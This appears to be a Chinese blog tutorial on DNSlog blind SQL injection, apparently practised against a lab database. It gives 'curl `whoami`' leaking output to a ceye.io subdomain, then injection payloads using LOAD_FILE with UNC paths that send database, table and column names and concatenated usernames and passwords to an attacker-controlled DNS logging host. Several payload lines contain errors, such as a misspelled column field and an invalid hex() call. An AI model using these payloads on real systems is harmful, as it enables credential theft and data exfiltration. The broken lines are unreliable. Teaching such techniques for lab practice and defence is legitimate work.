---
layout: post
title: "1.3.3-SQL注入-SQL盲注-Dnslog盲注"
date: 2018-06-23
category: web安全
tags: sql注入 sql盲注
---

> 需要目标机器时windows系统

## DnsLog盲注

### DnsLog盲注原理
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/01.jpeg)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/02.jpeg)
Dnslog平台：http://ceye.io/  
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/03.jpeg)



	http://ceye.io/profile
	curl mzq83x.ceye.io

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/05.png)


	curl `whoami`.mzq83x.ceye.io


![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/06.jpeg)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/04.jpeg)




![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/07.jpeg)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/08.jpeg)

### DnsLog盲注方法
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/09.jpeg)

	核心语法： SELECT LOAD_FILE(CONCAT('\\\\',(select database()),'.mysql.r5ourp.ceye.io\\abc'));
	sql语句不能含有特殊符号

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/10.jpeg)

	查表
	?id=1' and LOAD_FILE(CONCAT('\\\\',(select table_name from information_schema.tables where table_schema=database() limit 0,1),'.mysql.r5oup.ceye.io\\abc'))--+

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/11.jpeg)

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/12.jpeg)

	?id=1' and LOAD_FILE(CONCAT('\\\\',(select colum_name from information_schema.columns where table_name='users' limit 5,1),'.mysql.r5ourp.ceye.io\\abc'))--+

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/13.jpeg)
	
	?id=1' and LOAD_FILE(CONCAT('\\\\',(select concat(username,password) from security.users limit 0,1),'.mysql.r5ourp.ceye.io\\abc'))--+

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/14.jpeg)

	?id=1' and LOAD_FILE(CONCAT('\\\\',(select concat_ws('A',username,password) from security.users limit 0,1),'.mysql.r5ourp.ceye.io\\abc'))--+

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/15.jpeg)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/16.jpeg)

	?id=1' and LOAD_FILE(CONCAT('\\\\',(select hex('~',username,password) from security.users limit 0,1),'.mysql.r5ourp.ceye.io\\abc'))--+

![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/17.jpeg)




![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/18.jpeg)
![](https://coding.net/u/tea9/p/image/git/raw/master/blog_img/08/19.jpeg)

https://github.com/ADOOO/DnslogSqlinj